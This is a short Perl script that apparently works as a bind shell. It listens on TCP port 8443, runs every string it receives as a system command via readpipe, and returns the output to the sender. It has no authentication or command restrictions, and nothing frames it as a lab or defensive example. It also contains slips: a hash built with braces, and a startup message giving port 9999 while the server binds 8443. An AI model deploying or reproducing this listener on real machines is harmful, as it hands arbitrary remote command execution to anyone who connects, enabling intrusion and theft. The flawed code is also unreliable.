#!/usr/bin/perl
use strict;
use IO::Socket;
use IO::Select;
my %IP_Info={
          "client_ip"=>"10.200.138.68",
          "client_port"=>'1024',
          "server_ip"=>"127.0.0.1",
          "server_port"=>"9999",
          };
&main;
sub main{
my $client_ip=$IP_Info{client_ip};
my $client_port=$IP_Info{client_port};
my $server_ip=$IP_Info{server_ip};
my $server_port=8443;
print "Server_port:: $server_port\n";
my $Server=IO::Socket::INET->new(
#                  PeerAddr=>"$client_ip",
#                  PeerPort=>"$client_port",
#                  LocalAddr=>"$server_ip",
                  LocalPort=>$server_port,
                  Type=>SOCK_STREAM,
                  Proto=>"tcp",
                  Listen=>20, 
                             ) or die "Sorry,Server Socket don't creat: $!;\n";
print "Stating server on port:$IP_Info{server_port};\n";
while(1){
 my $receive_data;
 my $Client_Socket=$Server->accept();
 my $PeerAddr=$Client_Socket->peeraddr();
 my $PeerPort=$Client_Socket->peerport();
 while(1){
         $Client_Socket->recv($receive_data,1024);
         print "We recieve the command: $receive_data";
         chomp($receive_data);
         my $send_data=readpipe($receive_data);
          # my $send_data=system("$receive_data");
         chomp($send_data);
         print "Let us send the command result:$send_data\n";
        
         my $Send_Length=$Client_Socket->send($send_data);
        # print "Send the data lenght: $Send_Length;\n";
 
         }

close($Server) or die "Close socket falied $!\n"; 
}   
 }
